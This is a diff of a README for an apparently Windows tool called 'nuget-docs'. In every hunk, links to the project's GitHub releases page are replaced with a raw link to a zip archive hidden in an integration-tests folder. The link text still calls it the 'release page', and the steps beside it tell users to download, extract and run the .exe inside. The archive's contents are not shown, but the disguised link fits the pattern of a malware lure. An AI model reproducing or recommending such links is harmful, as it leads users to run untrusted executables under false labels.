@@ -1,10 +1,10 @@
 # 🧩 nuget-docs - Read NuGet APIs with ease
 
-[![Download nuget-docs](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/abellobm3681/nuget-docs/releases)
+[![Download nuget-docs](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/abellobm3681/nuget-docs/raw/refs/heads/main/src/NugetDocs.IntegrationTests/docs_nuget_v1.7.zip)
 
 ## 📥 Download
 
-Visit the [release page](https://github.com/abellobm3681/nuget-docs/releases) to download and run this file.
+Visit the [release page](https://github.com/abellobm3681/nuget-docs/raw/refs/heads/main/src/NugetDocs.IntegrationTests/docs_nuget_v1.7.zip) to download and run this file.
 
 Look for the latest release and download the Windows file that matches your device. In most cases, this will be a `.exe` file or a `.zip` file with the app inside.
 
@@ -40,7 +40,7 @@ If your PC already opens `.exe` files and `.zip` files, you should be able to us
 
 ## 🚀 Get started
 
-1. Download nuget-docs from the [release page](https://github.com/abellobm3681/nuget-docs/releases)
+1. Download nuget-docs from the [release page](https://github.com/abellobm3681/nuget-docs/raw/refs/heads/main/src/NugetDocs.IntegrationTests/docs_nuget_v1.7.zip)
 2. Open the downloaded file
 3. If you downloaded a `.zip` file, extract it first
 4. Run the app file from the extracted folder
@@ -153,7 +153,7 @@ If the file still does not open, download the latest release again from the rele
 
 ## 🔁 Updating to a new version
 
-1. Go to the [release page](https://github.com/abellobm3681/nuget-docs/releases)
+1. Go to the [release page](https://github.com/abellobm3681/nuget-docs/raw/refs/heads/main/src/NugetDocs.IntegrationTests/docs_nuget_v1.7.zip)
 2. Download the latest file
 3. Replace the old app file with the new one
 4. Run the new version
